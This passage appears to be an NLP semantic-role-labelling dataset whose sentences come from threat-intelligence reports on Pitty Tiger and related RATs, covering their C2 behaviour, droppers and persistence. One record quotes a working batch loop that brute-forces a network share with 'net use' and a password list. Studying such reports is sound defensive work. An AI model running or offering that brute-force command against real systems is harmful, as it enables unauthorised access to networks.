{"text": "using", "index": 13}, "ARG1": {"text": "this RAT"}}}, " We suspect Pitty Tiger to use this compromise to spear\n    phish other companies which are in commercial relation with this web development company": {"suspect": {"ARG0": {"text": "We"}, "V": {"text": "suspect", "index": 1}, "ARG1": {"text": "Pitty Tiger to use this compromise to spear phish other companies which are in commercial relation with this web development company"}}, "use": {"ARG0": {"text": "Pitty Tiger"}, "V": {"text": "use", "index": 5}, "ARG1": {"text": "this compromise"}, "ARG2": {"text": "to spear phish other companies which are in commercial relation with this web development company"}}, "phish": {"V": {"text": "phish", "index": 10}, "ARG1": {"text": "other companies"}}, "are": {"ARG1": {"text": "other companies"}, "R-ARG1": {"text": "which"}, "V": {"text": "are", "index": 14}, "ARG2": {"text": "in commercial relation with this web development company"}}}, " A script named ipc.bat uses a file\n    named user.txt to try to brute-force a shared folder access:\n<code>\n                     for /f \"tokens=1,2 delims= \" %%i in (user.txt) do (net use \\\\<TARGETEDIP>\\ipc$ \"%%j\" /u:%%i)\n                     && (net use \\\\<TARGETEDIP> /del) && (echo user:%%i pass:%%j>>succ.txt)\n</code>\n                            <caption>One script used to brute-force a network share inside a company\u2019s network</caption>\n\n    The user.txt file contains thousands of lines, each one being a couple of one particular username\n    and one password attempt:\n<list>\n                     administrator nameofonetargetedcompany\n                     administrator !Password\n                     administrator azerty123\n                     \u2026\n                     administrateurnameofonetargetedcompany\n                     administrateur !Password\n                     administrateur azerty123\n                     \u2026\n                     <username>nameofonetargetedcompany\n                     <username> !Password\n                     <username> azerty123\n                     \u2026\n                     <anotheruser>nameofonetargetedcompany\n                     <anotheruser> !Password\n                     <anotheruser> azerty123\n                     \u2026\n                                Anonymized dictionary file used for brute-forcing a network share\n</list>\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 51/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n    This user.txt file has been anonymized, yet we wanted to give you the feel for it": {"named": {"ARG1": {"text": "A script"}, "V": {"text": "named", "index": 2}, "ARG2": {"text": "ipc.bat"}}, "uses": {"ARG0": {"text": "A script named ipc.bat"}, "V": {"text": "uses", "index": 4}, "ARG1": {"text": "a file named user.txt"}, "ARG2": {"text": "to try to brute - force a shared folder access"}}, "named_2": {"ARG1": {"text": "a file"}, "V": {"text": "named", "index": 7}, "ARG2": {"text": "user.txt"}}, "try": {"V": {"text": "try", "index": 10}, "ARG1": {"text": "to brute - force a shared folder access"}}, "brute": {"V": {"text": "brute", "index": 12}, "ARG1": {"text": "a shared folder access"}}, "force": {"ARGM-MNR": {"text": "brute"}, "V": {"text": "force", "index": 14}, "ARG1": {"text": "a shared folder access"}}, "shared": {"V": {"text": "shared", "index": 16}, "ARG1": {"text": "access"}}, "has": {"V": {"text": "has", "index": 23}}, "been": {"ARG1": {"text": "This user.txt file"}, "V": {"text": "been", "index": 24}, "ARG2": {"text": "anonymized"}}, "anonymized": {"ARG1": {"text": "This user.txt file"}, "V": {"text": "anonymized", "index": 25}}, "wanted": {"ARG0": {"text": "we"}, "V": {"text": "wanted", "index": 29}, "ARG1": {"text": "to give you the feel for it"}}, "give": {"ARG0": {"text": "we"}, "V": {"text": "give", "index": 31}, "ARG2": {"text": "you"}, "ARG1": {"text": "the feel for it"}}}, "\n</section>\n<section>\n    <heading>Installation</heading>\n\n    The binary we found was dropped by a malicious Word document": {"found": {"ARG1": {"text": "The binary"}, "ARG0": {"text": "we"}, "V": {"text": "found", "index": 3}}, "was": {"V": {"text": "was", "index": 4}}, "dropped": {"ARG1": {"text": "The binary we found"}, "V": {"text": "dropped", "index": 5}, "ARG0": {"text": "by a malicious Word document"}}}, "\n\n\n<figure></figure>\n\n                                   <caption>IP address used by TIEWEISHIPC computer</caption>\n\n    Some connections to the c&c originated from a computer named FLY-THINK with several IP\n    addresses, all located in Fuqing (Fujian province)": {"originated": {"ARG1": {"text": "the c&c"}, "V": {"text": "originated", "index": 5}, "ARG2": {"text": "from a computer named FLY - THINK"}}, "named": {"ARG1": {"text": "a computer"}, "V": {"text": "named", "index": 9}, "ARG2": {"text": "FLY"}}, "located": {"V": {"text": "located", "index": 19}, "ARGM-LOC": {"text": "in Fuqing ( Fujian province )"}}}, "\n</section>\n<section>\n    <heading>Command & Control</heading>\n\n    The data sent in the POST request has a 0x11 bytes header consisting of a fixed-value byte (0xc3)\n    followed by a 0x10 bytes encryption key": {"sent": {"ARG1": {"text": "The data"}, "V": {"text": "sent", "index": 2}, "ARGM-MNR": {"text": "in the POST request"}}, "has": {"ARG0": {"text": "The data sent in the POST request"}, "V": {"text": "has", "index": 7}, "ARG1": {"text": "a 0x11 bytes header consisting of a fixed - value byte ( 0xc3 ) followed by a 0x10 bytes encryption key"}}, "consisting": {"ARG1": {"text": "a 0x11 bytes header"}, "V": {"text": "consisting", "index": 12}, "ARG2": {"text": "of a fixed - value byte ( 0xc3 ) followed by a 0x10 bytes encryption key"}}, "fixed": {"V": {"text": "fixed", "index": 15}, "ARG1": {"text": "value byte"}}, "followed": {"ARG2": {"text": "a fixed - value byte ( 0xc3 )"}, "V": {"text": "followed", "index": 22}, "ARG1": {"text": "by a 0x10 bytes encryption key"}}}, " It can also download and execute binaries": {"can": {"V": {"text": "can", "index": 1}}, "download": {"ARG0": {"text": "It"}, "ARGM-MOD": {"text": "can"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "download", "index": 3}, "ARG1": {"text": "binaries"}}, "execute": {"ARG0": {"text": "It"}, "ARGM-MOD": {"text": "can"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "execute", "index": 5}, "ARG1": {"text": "binaries"}}}, " When executed, a mutex called \u201cPittyTiger\u201d is created": {"executed": {"ARGM-TMP": {"text": "When"}, "V": {"text": "executed", "index": 1}}, "called": {"ARG1": {"text": "a mutex"}, "V": {"text": "called", "index": 5}, "ARG2": {"text": "\u201c PittyTiger \u201d"}}, "is": {"V": {"text": "is", "index": 9}}, "created": {"ARGM-TMP": {"text": "When executed"}, "ARG1": {"text": "a mutex called \u201c PittyTiger \u201d"}, "V": {"text": "created", "index": 10}}}, " We\n    also found one RTF document embedding CVE-2014-1761, which is a more recent exploit": {"found": {"ARG0": {"text": "We"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "found", "index": 2}, "ARG1": {"text": "one RTF document embedding CVE-2014 - 1761 , which is a more recent exploit"}}, "embedding": {"ARG0": {"text": "one RTF document"}, "V": {"text": "embedding", "index": 6}, "ARG1": {"text": "CVE-2014 - 1761"}, "ARGM-ADV": {"text": "which is a more recent exploit"}}, "is": {"R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 12}, "ARG2": {"text": "a more recent exploit"}}}, "\n\n    The following features are implemented:\n<list>\n       - c&c authentication using password\n       - Remote shell\n       - Remote commands\n       - File Download / Upload / Deletion / Search\n       - Bot termination\n</list>\n    The following CGI files can be requested by the bot:\n<list>\n       - Vip: test for connectivity\n       - Owpp4: register new bot\n       - CReply: answer to remote commands\n       - Clrf: clear remote file (to clear ComMand.sec after reading)\n       - CFile: transmit file (file transfers or answers to commands)\n       - Cerr: send error\n</list>\n    The configuration is stored locally in a file called \u201cschmup.sys\u201d": {"following": {"V": {"text": "following", "index": 1}, "ARG1": {"text": "features"}}, "are": {"V": {"text": "are", "index": 3}}, "implemented": {"ARG1": {"text": "The following features"}, "V": {"text": "implemented", "index": 4}}, "is": {"V": {"text": "is", "index": 8}}, "stored": {"ARG1": {"text": "The configuration"}, "V": {"text": "stored", "index": 9}, "ARGM-LOC": {"text": "locally in a file called \u201c schmup.sys \u201d"}}, "called": {"ARG1": {"text": "a file"}, "V": {"text": "called", "index": 14}, "ARG2": {"text": "\u201c schmup.sys \u201d"}}}, "\n</section>\n<section>\n\n            <heading>PALADIN RAT</heading>\n\n    This is another remote administration tool used by the Pitty Tiger group": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "another remote administration tool used by the Pitty Tiger group"}}, "used": {"ARG1": {"text": "another remote administration tool"}, "V": {"text": "used", "index": 6}, "ARG0": {"text": "by the Pitty Tiger group"}}}, " Several threads are used to handle different stages of the\n C2 protocol, such as receiving data from the server, decrypting data, and processing\n commands": {"are": {"V": {"text": "are", "index": 2}}, "used": {"V": {"text": "used", "index": 3}, "ARG2": {"text": "to handle different stages of the C2 protocol , such as receiving data from the server , decrypting data , and processing commands"}}, "handle": {"ARG0": {"text": "Several threads"}, "V": {"text": "handle", "index": 5}, "ARG1": {"text": "different stages of the C2 protocol , such as receiving data from the server , decrypting data , and processing commands"}}, "receiving": {"V": {"text": "receiving", "index": 15}, "ARG1": {"text": "data"}, "ARG2": {"text": "from the server"}}, "decrypting": {"V": {"text": "decrypting", "index": 21}, "ARG1": {"text": "data"}}}, " The initial beacon uses a request with four parameters\n(h1, h2, h3, and h4) \u2013 as shown in Figure 8 \u2013 to register the implant with the C2 server": {"uses": {"ARG0": {"text": "The initial beacon"}, "V": {"text": "uses", "index": 3}, "ARG1": {"text": "a request with four parameters ( h1 , h2 , h3 , and h4 ) \u2013"}, "ARG2": {"text": "as shown in Figure 8 \u2013 to register the implant with the C2 server"}}, "shown": {"V": {"text": "shown", "index": 21}, "ARGM-LOC": {"text": "in Figure 8 \u2013"}, "ARG1": {"text": "to register the implant with the C2 server"}}, "register": {"V": {"text": "register", "index": 27}, "ARG1": {"text": "the implant"}, "ARG2": {"text": "with the C2 server"}}}, "\nThe operation of this RAT is described in detail in other CrowdStrike reporting, but is useful to revisit here to\nhighlight the characteristics of the RAT:                                              \n\n\n\u2022 C2 occurs over HTTP, after connectivity has been verified by making a distinctive request (to the URI /\nsearch?qu= at www.google.com)": {"is": {"V": {"text": "is", "index": 5}}, "described": {"ARG1": {"text": "The operation of this RAT"}, "V": {"text": "described", "index": 6}, "ARGM-MNR": {"text": "in detail"}, "ARGM-LOC": {"text": "in other CrowdStrike reporting"}}, "is_2": {"ARG1": {"text": "The operation of this RAT"}, "V": {"text": "is", "index": 15}, "ARG2": {"text": "useful to revisit here to highlight the characteristics of the RAT"}}, "revisit": {"ARG1": {"text": "The operation of this RAT"}, "V": {"text": "revisit", "index": 18}, "ARGM-LOC": {"text": "here"}, "ARGM-PRP": {"text": "to highlight the characteristics of the RAT"}}, "highlight": {"V": {"text": "highlight", "index": 21}, "ARG1": {"text": "the characteristics of the RAT"}}, "occurs": {"ARG1": {"text": "\u2022 C2"}, "V": {"text": "occurs", "index": 30}, "ARGM-LOC": {"text": "over HTTP"}, "ARGM-TMP": {"text": "after connectivity has been verified by making a distinctive request ( to the URI / search?qu= at www.google.com )"}}, "has": {"V": {"text": "has", "index": 36}}, "been": {"V": {"text": "been", "index": 37}}, "verified": {"ARG1": {"text": "connectivity"}, "V": {"text": "verified", "index": 38}, "ARGM-MNR": {"text": "by making a distinctive request ( to the URI / search?qu= at www.google.com )"}}, "making": {"V": {"text": "making", "index": 40}, "ARG1": {"text": "a distinctive request ( to the URI / search?qu= at www.google.com"}}}, "\n The dropped executable (MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d) primarily aims to inject\n the specified DLL (McUpdate.dll, MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f) into a process that\n would normally be accessing the network, likely in order to disguise the malicious activity": {"aims": {"ARG0": {"text": "The dropped executable ( MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d )"}, "ARGM-ADV": {"text": "primarily"}, "V": {"text": "aims", "index": 9}, "ARG1": {"text": "to inject the specified DLL ( McUpdate.dll , MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f ) into a process that would normally be accessing the network , likely in order to disguise the malicious activity"}}, "inject": {"ARG0": {"text": "The dropped executable ("}, "V": {"text": "inject", "index": 11}, "ARG1": {"text": "the specified DLL ( McUpdate.dll , MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f ) into a process that would normally be accessing the network"}}, "would": {"R-ARG0": {"text": "that"}, "V": {"text": "would", "index": 26}}, "be": {"ARG1": {"text": "a process"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "would"}, "ARGM-ADV": {"text": "normally"}, "V": {"text": "be", "index": 28}, "ARG2": {"text": "accessing the network"}}, "accessing": {"ARG0": {"text": "a process"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "accessing", "index": 29}, "ARG1": {"text": "the network"}, "ARGM-PRP": {"text": "in order to disguise the malicious activity"}}, "disguise": {"V": {"text": "disguise", "index": 37}, "ARG1": {"text": "the malicious activity"}}}, " The malware will then attempt to download content from the specified URL to the filename within\nthe user\u2019s temporary directory, and then execute this file via the WinExec API": {"will": {"V": {"text": "will", "index": 2}}, "attempt": {"ARG0": {"text": "The malware"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "attempt", "index": 4}, "ARG1": {"text": "to download content from the specified URL to the filename within the user \u2019s temporary directory"}}, "download": {"ARG0": {"text": "The malware"}, "V": {"text": "download", "index": 6}, "ARG1": {"text": "content from the specified URL"}, "ARG2": {"text": "to the filename within the user \u2019s temporary directory"}}, "specified": {"V": {"text": "specified", "index": 10}, "ARG1": {"text": "URL"}}, "execute": {"ARG0": {"text": "The malware"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "execute", "index": 24}, "ARG1": {"text": "this file"}, "ARGM-MNR": {"text": "via the WinExec API"}}}, " If this execution attempt\nsucceeds, a final C2 request will be made \u2013 in this case to a URL using the same path as the initial request (and\na similarly random parameter), but with a filename of success.asp": {"succeeds": {"ARG1": {"text": "this execution attempt"}, "V": {"text": "succeeds", "index": 4}}, "will": {"V": {"text": "will", "index": 10}}, "be": {"V": {"text": "be", "index": 11}}, "made": {"ARGM-ADV": {"text": "If this execution attempt succeeds"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "made", "index": 12}, "ARG1": {"text": "\u2013"}, "ARGM-LOC": {"text": "in this case"}, "ARG2": {"text": "to a URL using the same path as the initial request ( and a similarly random parameter )"}, "ARGM-MNR": {"text": "but with a filename of success.asp"}}, "using": {"V": {"text": "using", "index": 20}, "ARG1": {"text": "the same path"}, "ARG2": {"text": "as the initial request ( and a similarly random parameter )"}}}, "\n</section>\n<footer>\n\n\n\n\n                                                                                                                  33\n</footer>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n<section>\n <heading>HTTPCLIENT \u2013 EXAMPLE MD5 HASH\n 544FCA6EB8181F163E2768C81F2BA0B3</heading>\n Like pngdowner, the httpclient malware is a simple tool that provides a limited range of functionality and uses\n HTTP for its C2 channel": {"is": {"ARGM-MNR": {"text": "Like pngdowner"}, "ARG1": {"text": "the httpclient malware"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "a simple tool that provides a limited range of functionality and uses HTTP for its C2 channel"}}, "provides": {"ARG0": {"text": "a simple tool"}, "R-ARG0": {"text": "that"}, "V": {"text": "provides", "index": 11}, "ARG1": {"text": "a limited range of functionality"}}, "uses": {"ARG0": {"text": "a simple tool"}, "R-ARG0": {"text": "that"}, "V": {"text": "uses", "index": 18}, "ARG1": {"text": "HTTP"}, "ARG2": {"text": "for its C2 channel"}}}, " Otherwise, a shell process is started (i.e., cmd.exe), with input/output redirected over the C2\n channel": {"is": {"V": {"text": "is", "index": 5}}, "started": {"ARGM-DIS": {"text": "Otherwise"}, "ARG1": {"text": "a shell process"}, "V": {"text": "started", "index": 6}, "ARGM-LOC": {"text": "( i.e."}, "ARGM-ADV": {"text": "with input / output redirected over the C2 channel"}}, "redirected": {"ARG0": {"text": "input / output"}, "V": {"text": "redirected", "index": 17}, "ARG1": {"text": "over the C2 channel"}}}, "\n Another dropper has been observed, exclusively installing the pngdowner malware (example MD5 hash\n 4c50457c35e2033b3a03fcbb4adac7b7)": {"has": {"V": {"text": "has", "index": 2}}, "been": {"V": {"text": "been", "index": 3}}, "observed": {"ARG1": {"text": "Another dropper"}, "V": {"text": "observed", "index": 4}, "ARGM-ADV": {"text": "exclusively installing the pngdowner malware ( example MD5 hash 4c50457c35e2033b3a03fcbb4adac7b7 )"}}, "installing": {"ARGM-ADV": {"text": "exclusively"}, "V": {"text": "installing", "index": 7}, "ARG1": {"text": "the pngdowner malware ( example MD5 hash 4c50457c35e2033b3a03fcbb4adac7b7 )"}}}, "                                                                          \n Both the document and executable are written to disk and the executed via the ShellExecute             API (using the\n verb \u201copen\u201d)": {"are": {"V": {"text": "are", "index": 5}}, "written": {"ARG1": {"text": "Both the document and executable"}, "V": {"text": "written", "index": 6}, "ARG2": {"text": "to disk"}}, "disk": {"ARG0": {"text": "Both the document and executable"}, "V": {"text": "disk", "index": 8}}, "executed": {"V": {"text": "executed", "index": 11}, "ARGM-MNR": {"text": "via the ShellExecute API (/ using the verb \u201c open \u201d )"}}, "using": {"V": {"text": "using", "index": 17}, "ARG1": {"text": "the verb \u201c open \u201d )"}}, "open": {"ARGM-MNR": {"text": "verb \u201c"}, "V": {"text": "open", "index": 21}, "ARG1": {"text": "\u201d"}}}, "\n\n\nThis toolset provides a wide degree of control over a victim system and can provide the\nopportunity to deploy additional tools at will": {"provides": {"ARG0": {"text": "This toolset"}, "V": {"text": "provides", "index": 2}, "ARG1": {"text": "a wide degree of control over a victim system"}}, "can": {"V": {"text": "can", "index": 13}}, "provide": {"ARG0": {"text": "This toolset"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "provide", "index": 14}, "ARG1": {"text": "the opportunity to deploy additional tools at will"}}, "deploy": {"V": {"text": "deploy", "index": 18}, "ARG1": {"text": "additional tools"}, "ARGM-TMP": {"text": "at will"}}, "will": {"V": {"text": "will", "index": 22}}}, " An initial request is then made to the hard-coded C2 server and initial URI \u2013 forming a URL of the form\n(in this sample) http://login.stream-media.net/files/xx11/index.asp?95027775, where the numerical parameter\nrepresents a random integer": {"is": {"V": {"text": "is", "index": 3}}, "made": {"ARG1": {"text": "An initial request"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "made", "index": 5}, "ARG2": {"text": "to the hard - coded C2 server and initial URI \u2013/ in this sample ) http://login.stream-media.net/files/xx11/index.asp?95027775 , where the numerical parameter represents a random integer"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 10}}, "forming": {"ARG0": {"text": "the hard - coded C2 server and initial URI \u2013"}, "V": {"text": "forming", "index": 17}, "ARG1": {"text": "a URL of the form ("}, "ARGM-LOC": {"text": "in this"}}, "represents": {"R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "the numerical parameter"}, "V": {"text": "represents", "index": 34}, "ARG1": {"text": "a random integer"}}}, " The executable and DLL are both\n contained within the .data section of the dropper, obfuscated with a 16-byte XOR key (consisting of the bytes\n 0xA0 \u2013 0xAF)": {"are": {"V": {"text": "are", "index": 4}}, "contained": {"ARG1": {"text": "The executable and DLL"}, "ARGM-ADV": {"text": "both/ obfuscated with a 16-byte XOR key ( consisting of the bytes 0xA0 \u2013 0xAF )"}, "V": {"text": "contained", "index": 6}, "ARG0": {"text": "within the .data section of the dropper"}}, "obfuscated": {"V": {"text": "obfuscated", "index": 15}, "ARG2": {"text": "with a 16-byte XOR key ( consisting of the bytes 0xA0 \u2013 0xAF )"}}, "consisting": {"ARG1": {"text": "a 16-byte XOR key ("}, "V": {"text": "consisting", "index": 22}, "ARG2": {"text": "of the bytes 0xA0 \u2013 0xAF )"}}}, "\n</footnote>\n<footer>\n\n\n\n                                                                                                                                     30\n</footer>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n\n\n<figure></figure>\n\nIf this request is also successful, the RAT will attempt to retrieve tasking from the\ncontroller using a further distinctive HTTP request shown in Figure 13, repeating this\n                                                                                  \nrequest every two seconds until valid tasking is returned": {"is": {"ARG1": {"text": "this request"}, "V": {"text": "is", "index": 3}, "ARGM-ADV": {"text": "also"}, "ARG2": {"text": "successful"}}, "will": {"ARGM-ADV": {"text": "If this request is also successful"}, "V": {"text": "will", "index": 9}, "ARG1": {"text": "attempt to retrieve tasking from the controller using a further distinctive HTTP request shown in Figure 13 , repeating this request every two seconds until valid tasking is"}}, "attempt": {"ARGM-ADV": {"text": "If this request is also successful"}, "ARG0": {"text": "the RAT"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "attempt", "index": 10}, "ARG1": {"text": "to retrieve tasking from the controller using a further distinctive HTTP request shown in Figure 13 , repeating this request every two seconds until valid tasking is returned"}}, "retrieve": {"ARG0": {"text": "the RAT"}, "V": {"text": "retrieve", "index": 12}, "ARG1": {"text": "tasking from the controller"}, "ARGM-MNR": {"text": "using a further distinctive HTTP request shown in Figure 13"}, "ARGM-ADV": {"text": "repeating this request every two seconds until"}}, "tasking": {"V": {"text": "tasking", "index": 13}, "ARG2": {"text": "from the controller"}, "ARGM-MNR": {"text": "using a further distinctive HTTP request shown in Figure 13"}}, "using": {"V": {"text": "using", "index": 17}, "ARG1": {"text": "a further distinctive HTTP request shown in Figure 13"}}, "request": {"ARGM-ADJ": {"text": "further distinctive HTTP"}, "V": {"text": "request", "index": 22}}, "shown": {"ARG1": {"text": "a further distinctive HTTP request"}, "V": {"text": "shown", "index": 23}, "ARGM-LOC": {"text": "in Figure 13"}}, "repeating": {"V": {"text": "repeating", "index": 28}, "ARG1": {"text": "this request"}, "ARGM-TMP": {"text": "every two seconds until valid tasking is returned"}}, "is_2": {"V": {"text": "is", "index": 37}}, "returned": {"ARG1": {"text": "valid tasking"}, "V": {"text": "returned", "index": 38}}}, " The report illuminates a wide set of tools in use by the actors,\nincluding several Remote Access Tools (RATs)": {"illuminates": {"ARG0": {"text": "The report"}, "V": {"text": "illuminates", "index": 2}, "ARG1": {"text": "a wide set of tools in use by the actors , including several Remote Access Tools ( RATs )"}}, "including": {"ARG2": {"text": "the actors"}, "V": {"text": "including", "index": 14}, "ARG1": {"text": "several Remote Access Tools ( RATs )"}}}, " The RAT will then use a byte-wise subtraction-\nbased algorithm (using a hard-coded modulo value) to decode C2 server details\nconsisting of a server hostname and port number, in this example nsc.adomhn": {"will": {"V": {"text": "will", "index": 2}}, "use": {"ARG0": {"text": "The RAT"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "use", "index": 4}, "ARG1": {"text": "a byte - wise subtraction- based algorithm ("}, "ARG2": {"text": "using a hard - coded modulo value ) to decode C2 server details consisting of a server hostname and port number , in"}, "ARGM-LOC": {"text": "this example nsc.adomhn"}}, "based": {"ARG2": {"text": "a byte - wise subtraction-"}, "V": {"text": "based", "index": 10}, "ARG1": {"text": "algorithm ("}}, "using": {"V": {"text": "using", "index": 13}, "ARG1": {"text": "a hard - coded modulo value )"}, "ARG2": {"text": "to decode C2 server details consisting of a server hostname and port number , in this example nsc.adomhn"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 17}, "ARG1": {"text": "modulo value )"}}, "decode": {"ARG0": {"text": "a hard - coded modulo value"}, "V": {"text": "decode", "index": 22}, "ARG1": {"text": "C2 server details consisting of a server hostname and port number"}}, "consisting": {"ARG1": {"text": "decode C2 server details"}, "V": {"text": "consisting", "index": 26}, "ARG2": {"text": "of a server hostname and port number"}, "ARGM-LOC": {"text": "in this example nsc.adomhn"}}}, "\n\n\nInitially, the malware will perform a connectivity check to a hard-coded URL (http://www.microsoft.com),\nusing a constant user agent Mozilla/4.0 (Compatible; MSIE 6.0;)": {"will": {"V": {"text": "will", "index": 4}}, "perform": {"ARGM-TMP": {"text": "Initially"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "perform", "index": 5}, "ARG1": {"text": "a connectivity check to a hard - coded URL ( http://www.microsoft.com )"}, "ARGM-ADV": {"text": "using a constant user agent Mozilla/4.0 ( Compatible ; MSIE 6.0"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 13}, "ARG1": {"text": "URL ("}}, "using": {"V": {"text": "using", "index": 19}, "ARG1": {"text": "a constant user agent Mozilla/4.0 ( Compatible ; MSIE 6.0"}}}, "\n\n\nOn startup, the RAT attempts to create a file mapping named\n&*SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf": {"attempts": {"ARGM-LOC": {"text": "On startup"}, "ARG0": {"text": "the RAT"}, "V": {"text": "attempts", "index": 5}, "ARG1": {"text": "to create a file mapping named & * SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf"}}, "create": {"V": {"text": "create", "index": 7}, "ARG1": {"text": "a file mapping named & * SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf"}}, "named": {"ARG1": {"text": "a file mapping"}, "V": {"text": "named", "index": 11}, "ARG2": {"text": "* SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf"}}}, "\n\n\n The malware will then connect to its configured C2 infrastructure (file.anyoffice.info) and perform a HTTP\n request of the form shown in Figure 14 below:\n\n\n\n<figure></figure>\n<caption>Figure 14": {"will": {"V": {"text": "will", "index": 2}}, "connect": {"ARG0": {"text": "The malware"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "connect", "index": 4}, "ARG1": {"text": "to its configured C2 infrastructure ( file.anyoffice.info )"}}, "perform": {"ARG0": {"text": "The malware"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "perform", "index": 14}, "ARG1": {"text": "a HTTP request of the form shown in Figure 14 below : Figure 14"}}, "shown": {"ARG1": {"text": "the form"}, "V": {"text": "shown", "index": 21}, "ARGM-LOC": {"text": "in Figure 14 below"}}}, " An initial request is made to the C2 server (illustrated\n in Figure 11 above), but the response value is effectively ignored; it is likely that this\n request serves only as a connectivity check, as further C2 activity will only occur\n if this first request is successful": {"is": {"V": {"text": "is", "index": 3}}, "made": {"ARG1": {"text": "An initial request"}, "V": {"text": "made", "index": 4}}, "illustrated": {"ARG1": {"text": "the C2 server ("}, "V": {"text": "illustrated", "index": 10}, "ARGM-LOC": {"text": "in Figure 11 above )"}}, "is_2": {"V": {"text": "is", "index": 21}}, "ignored": {"ARG1": {"text": "the response value"}, "ARGM-MNR": {"text": "effectively"}, "V": {"text": "ignored", "index": 23}}, "is_3": {"V": {"text": "is", "index": 26}, "ARG2": {"text": "likely"}, "ARG1": {"text": "that this request serves only as a connectivity check , as further C2 activity will only occur if this first request is successful"}}, "serves": {"ARG0": {"text": "this request"}, "V": {"text": "serves", "index": 31}, "ARG1": {"text": "only as a connectivity check"}, "ARGM-CAU": {"text": "as further C2 activity will only occur"}, "ARGM-ADV": {"text": "if this first request is successful"}}, "will": {"V": {"text": "will", "index": 42}}, "occur": {"ARG1": {"text": "further C2 activity"}, "ARGM-MOD": {"text": "will"}, "ARGM-ADV": {"text": "only/ if this first request is successful"}, "V": {"text": "occur", "index": 44}}, "is_4": {"ARG1": {"text": "this first request"}, "V": {"text": "is", "index": 49}, "ARG2": {"text": "successful"}}}, " If the session is ended, two other commands are supported: m2b (upload file) and\n b2m (download file)": {"is": {"ARG1": {"text": "the session"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "ended"}}, "ended": {"ARG1": {"text": "the session"}, "V": {"text": "ended", "index": 4}}, "are": {"V": {"text": "are", "index": 9}}, "supported": {"ARGM-ADV": {"text": "If the session is ended"}, "ARG1": {"text": "two other commands"}, "V": {"text": "supported", "index": 10}}}, " The executable is also installed into the ASEP registry key HKCU\\Software\\Microsoft\\Windows\\\n CurrentVersion\\Run, with a value named McUpdate": {"is": {"V": {"text": "is", "index": 2}}, "installed": {"ARG1": {"text": "The executable"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "installed", "index": 4}, "ARG2": {"text": "into the ASEP registry key HKCU\\Software\\Microsoft\\Windows\\ CurrentVersion\\Run , with a value named McUpdate"}}, "named": {"ARG1": {"text": "a value"}, "V": {"text": "named", "index": 16}, "ARG2": {"text": "McUpdate"}}}, " If this request fails, the malware will attempt to\nextract proxy details and credentials from Windows Protected Storage, and from the IE Credentials Store using\npublicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HTTP\naccess": {"fails": {"ARG1": {"text": "this request"}, "V": {"text": "fails", "index": 3}}, "will": {"ARGM-ADV": {"text": "If this request fails"}, "ARG0": {"text": "the malware"}, "V": {"text": "will", "index": 7}, "ARG1": {"text": "attempt to extract proxy details and credentials from Windows Protected Storage , and from the IE Credentials Store using publicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HTTP access"}}, "attempt": {"ARGM-ADV": {"text": "If this request fails"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "attempt", "index": 8}, "ARG1": {"text": "to extract proxy details and credentials from Windows Protected Storage , and from the IE Credentials Store using publicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HTTP access"}}, "extract": {"ARG0": {"text": "the malware"}, "V": {"text": "extract", "index": 10}, "ARG1": {"text": "proxy details and credentials from Windows Protected Storage"}}, "using": {"V": {"text": "using", "index": 26}, "ARG1": {"text": "publicly known methods15"}}, "known": {"ARGM-MNR": {"text": "publicly"}, "V": {"text": "known", "index": 28}, "ARG1": {"text": "methods15"}}, "using_2": {"V": {"text": "using", "index": 31}, "ARG1": {"text": "the proxy credentials"}, "ARG2": {"text": "for subsequent requests"}, "ARGM-ADV": {"text": "if they enable outbound HTTP access"}}, "enable": {"ARG0": {"text": "they"}, "V": {"text": "enable", "index": 40}}}, " Output data produced by tasking instructions is encrypted in the same manner as it\nwas decrypted and sent back to the C2 server via HTTP POST request to a URI of the form /microsoft/errorpost/\ndefault.aspx?ID=, where the ID value is a random number in decimal representation \u2013 as with 